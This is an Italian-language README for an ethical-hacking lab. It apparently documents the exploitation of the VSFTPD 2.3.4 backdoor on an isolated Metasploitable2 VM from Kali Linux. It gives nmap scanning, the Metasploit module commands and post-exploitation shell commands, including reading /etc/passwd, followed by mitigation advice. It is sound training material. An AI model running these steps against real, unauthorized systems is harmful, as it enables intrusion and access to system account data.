# Cybersecurity_Metasploitable2_lab
Penetration testing laboratory on Metasploitable2
# Laboratorio di Penetration Testing: Sfruttamento di VSFTPD 2.3.4 Backdoor su Metasploitable2

Questo repository documenta un laboratorio pratico di penetration testing, che include le fasi di ricognizione, scansione e sfruttamento, condotto su una macchina virtuale Metasploitable2 utilizzando Kali Linux. L'obiettivo principale è stato dimostrare lo sfruttamento della vulnerabilità VSFTPD 2.3.4 Backdoor.

---

## Indice

* [1. Panoramica del Laboratorio](#1-panoramica-del-laboratorio)
* [2. Architettura del Laboratorio](#2-architettura-del-laboratorio)
* [3. Fasi dell'Attacco](#3-fasi-dellattacco)
    * [3.1 Ricognizione (Reconnaissance)](#31-ricognizione-reconnaissance)
    * [3.2 Scansione delle Vulnerabilità (Vulnerability Scanning)](#32-scansione-delle-vulnerabilita-vulnerability-scanning)
    * [3.3 Sfruttamento (Exploitation)](#33-sfruttamento-exploitation)
    * [3.4 Post-Sfruttamento (Post-Exploitation)](#34-post-sfruttamento-post-exploitation)
* [4. Raccomandazioni e Mitigazioni](#4-raccomandazioni-e-mitigazioni)
* [5. Strumenti Utilizzati](#5-strumenti-utilizzati)
* [6. Risorse Utili](#6-risorse-utili)

---

## 1. Panoramica del Laboratorio

Questo progetto serve come esercitazione pratica di hacking etico, simulando uno scenario in cui un attaccante cerca di compromettere una macchina con vulnerabilità note. Metasploitable2 è stata scelta come target ideale per le sue numerose debolezze intenzionali, mentre Kali Linux è la piattaforma standard per gli strumenti di penetration testing.

## 2. Architettura del Laboratorio

Il laboratorio è stato configurato utilizzando **VMware** con le seguenti macchine virtuali, connesse tramite una **rete "Host-only"**:

* **Macchina Attaccante:** **Kali Linux**
    * Indirizzo IP: `172.16.236.130`
* **Macchina Target:** **Metasploitable2**
    * Indirizzo IP: `172.16.236.131`

Questa configurazione garantisce che l'ambiente di test sia isolato dalla rete domestica/aziendale, prevenendo accessi non intenzionali o danni.

### Schema della Rete

[Kali Linux] <---------------------> [Metasploitable2]
|                                    |
| (VMware Host-only Adapter)     |
V                                    V
[Macchina Host Fisica]

<img width="1377" height="976" alt="Screenshot_2025-07-10_16-25-16" src="https://github.com/user-attachments/assets/139fd4d0-f63d-422c-b6a0-a0a191b50162" />

<img width="1242" height="904" alt="Screenshot_2025-07-10_16-26-04" src="https://github.com/user-attachments/assets/4d90bd35-d831-4ebd-bec6-f82bc30d3df6" />

## 3. Fasi dell'Attacco

Questa sezione descrive in dettaglio le fasi dell'attacco, con particolare riferimento all'exploit del backdoor VSFTPD.

### 3.1 Ricognizione (Reconnaissance)

* **Scopo:** Identificare la presenza del target sulla rete e il suo indirizzo IP.
* **Strumenti:** `ping`
* **Comandi eseguiti da Kali:**
    ```bash
    ping 172.16.236.131 
    ```
    **Output atteso:**
    ```
    PING 172.16.236.131 (172.16.236.131) 56(84) bytes of data.
    64 bytes from 172.16.236.131: icmp_seq=1 ttl=64 time=0.500 ms
    ...
    ```
    Quando si riceve una risposta ai pacchetti ICMP, come in questo caso, significa che c'è una risposta dall'IP destinatario a cui sono stati inviati.

### 3.2 Scansione delle Vulnerabilità (Vulnerability Scanning)

* **Scopo:** Identificare i servizi in esecuzione sul target e possibili vulnerabilità.
* **Strumenti:** `nmap`
* **Comandi eseguiti da Kali:**
    ```bash
    nmap -sV -p- 172.16.236.131 
    ```
    **Spiegazione del comando:**
    * `-sV`: Tenta di determinare la versione del servizio sulle porte aperte.
    * `-p-`: Scansiona tutti le 65535 porte.
   
    <img width="1411" height="986" alt="Screenshot_2025-07-10_15-57-49" src="https://github.com/user-attachments/assets/d7e92579-2744-4a8b-a1f0-550ea7be29e6" />

    **Analisi dell'Output:**
    * Si noti l'identificazione di `vsftpd 2.3.4` sulla porta 21/tcp. Questa versione è nota per avere una backdoor.

### 3.3 Sfruttamento (Exploitation)

* **Scopo:** Utilizzare una vulnerabilità scoperta per ottenere accesso alla macchina target.
* **Vulnerabilità Sfruttata:** Backdoor in VSFTPD 2.3.4 (CVE sconosciuta, ma nota come "backdoor del 2011").
* **Strumenti:** Metasploit Framework (`msfconsole`)

**Passi Dettagliati:**

1.  **Avvio di `msfconsole`:**
    ```bash
    msfconsole
    ```
<img width="1406" height="996" alt="Screenshot_2025-07-10_15-58-23" src="https://github.com/user-attachments/assets/7ba018cb-f8f6-4fc5-a032-480707b1b667" />

2.  **Ricerca dell'exploit:**
    ```
    search vsftpd
    ```
    **Output:**
    ```
    Matching Modules
    ================

       #  Name                              Disclosure Date  Rank    Check  Description
       -  ----                              ---------------  ----    -----  -----------
       0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  Yes    VSFTPD v2.3.4 Backdoor Command Execution
    ```
<img width="1395" height="985" alt="Screenshot_2025-07-10_15-58-37" src="https://github.com/user-attachments/assets/80f999a6-dfdf-4f2f-b062-0a8a4c8334a9" />
    
3.  **Selezione dell'exploit:**
    ```
    use exploit/unix/ftp/vsftpd_234_backdoor
    ```

4.  **Impostazione dell'IP del Target (`RHOSTS`):**
    ```
    set RHOSTS 172.16.236.131  
    ```
    **Verifica delle opzioni:**
    ```
    show options
    ```
    <img width="1405" height="992" alt="Screenshot_2025-07-10_15-59-11" src="https://github.com/user-attachments/assets/a079a1da-04c2-4ef5-a807-7bdf73bcfa74" />

5.  **Esecuzione dell'exploit:**
    
    exploit
    
   <img width="1391" height="993" alt="Screenshot_2025-07-10_15-59-23" src="https://github.com/user-attachments/assets/6ef937ba-387b-440a-b7f7-ce286be41c0d" />
    


### 3.4 Post-Sfruttamento (Post-Exploitation)

* **Scopo:** Mantenere l'accesso, raccogliere informazioni, escalation dei privilegi (se non già root), ecc.
* **Esempi di comandi eseguiti sulla shell di Metasploitable:**
    ```bash
    whoami 
    ls -la /
    cat /etc/passwd




<img width="1388" height="991" alt="Screenshot_2025-07-10_15-59-53" src="https://github.com/user-attachments/assets/c0c1a094-2a51-4385-b25c-fb889948a705" />
## 4. Raccomandazioni e Mitigazioni

* **Aggiornamenti Software:** Mantenere tutti i servizi e il sistema operativo aggiornati (Metasploitable2 è volutamente non aggiornato per scopi di test).
* **Principio del Minimo Privilegio:** Eseguire i servizi con il minor privilegio necessario.
* **Firewall:** Implementare regole firewall per limitare l'accesso ai servizi solo dalle fonti necessarie.
* **Monitoraggio:** Implementare il monitoraggio per rilevare attività sospette.
* **Disabilitare Servizi Inutilizzati:** Disabilitare i servizi che non sono strettamente necessari.

## 5. Strumenti Utilizzati

* **VMware:** Per la gestione delle macchine virtuali.
* **Kali Linux:** Distribuzione per penetration testing.
* **Metasploitable2:** Macchina virtuale deliberatamente vulnerabile.
* **Nmap:** Scanner di rete per la scoperta di host e servizi.
* **Metasploit Framework:** Piattaforma per lo sviluppo e l'esecuzione di exploit.

## 6. Risorse Utili

* [Kali Linux Official Website](https://www.kali.org/)
* [Metasploitable2 Documentation](https://docs.rapid7.com/metasploit/metasploitable2/)
* [Nmap Official Website](https://nmap.org/)
* [Metasploit Framework Official Website](https://www.metasploit.com/)
* [Guida a Markdown](https://www.markdownguide.org/basic-syntax/)


